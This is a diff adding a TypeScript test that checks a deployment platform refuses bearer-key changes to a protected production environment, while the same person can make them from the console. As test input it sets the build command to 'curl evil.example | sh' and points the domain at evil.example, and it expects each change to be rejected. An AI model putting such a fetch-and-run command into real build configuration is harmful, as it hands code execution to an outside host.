@@ -145,6 +145,36 @@ for (const backend of backends) {
 			expect(await f.registry.getAppEnv('app', 'prod')).toMatchObject({ protected: 1, trigger_ref: null })
 		})
 
+		test("a person's own key is a key: with a bearer, the person cannot redirect a protected environment", async () => {
+			const f = await open()
+			await f.registry.createApp({ id: 'app', repoUrl: 'github.com/acme/app', buildCmd: 'bun run build' })
+			await f.registry.upsertAppEnv(providerEnvironment('app', 'prod', { triggerRef: 'refs/heads/main' }))
+			const bearer = (request: Request) => {
+				const headers = new Headers(request.headers)
+				headers.set('Authorization', 'Bearer px_test')
+				return new Request(request, { headers })
+			}
+			const put = (environment: Record<string, string>) =>
+				rpcRequest('apps.environments.put', { appId: 'app', env: 'prod', environment: { ...envelopes, triggerRef: 'refs/heads/main', ...environment } })
+			const asPerson = f.as(manager)
+
+			const build = await rpcResult(bearer(rpcRequest('apps.update', { appId: 'app', app: { buildCmd: 'curl evil.example | sh' } })), asPerson)
+			expect(build.status).toBe(403)
+			expect(await build.text()).toContain(refusal('prod', "its application's buildCmd"))
+			const triggerRef = await rpcResult(bearer(put({ triggerRef: 'refs/heads/unreviewed' })), asPerson)
+			expect(triggerRef.status).toBe(403)
+			expect(await triggerRef.text()).toContain(refusal('prod', 'its trigger ref'))
+			expect((await rpcResult(bearer(put({ domain: 'evil.example' })), asPerson)).status).toBe(403)
+			expect((await rpcResult(bearer(put({ publicOrigin: 'https://evil.example' })), asPerson)).status).toBe(403)
+			expect(await f.registry.getApp('app')).toMatchObject({ build_cmd: 'bun run build' })
+			expect(await f.registry.getAppEnv('app', 'prod')).toMatchObject({ trigger_ref: 'refs/heads/main', domain: null, public_origin: null })
+
+			// The same person in the console, without a bearer, makes the change.
+			expect((await rpcResult(rpcRequest('apps.update', { appId: 'app', app: { buildCmd: 'bun run build:prod' } }), asPerson)).status).toBe(200)
+			expect((await rpcResult(put({ triggerRef: 'refs/heads/release' }), asPerson)).status).toBe(200)
+			expect(await f.registry.getAppEnv('app', 'prod')).toMatchObject({ trigger_ref: 'refs/heads/release' })
+		})
+
 		test('a person registers a protected environment with a trigger ref, and a key an unprotected one', async () => {
 			const f = await open()
 			const register = (auth: AuthContext, id: string, env: string) =>
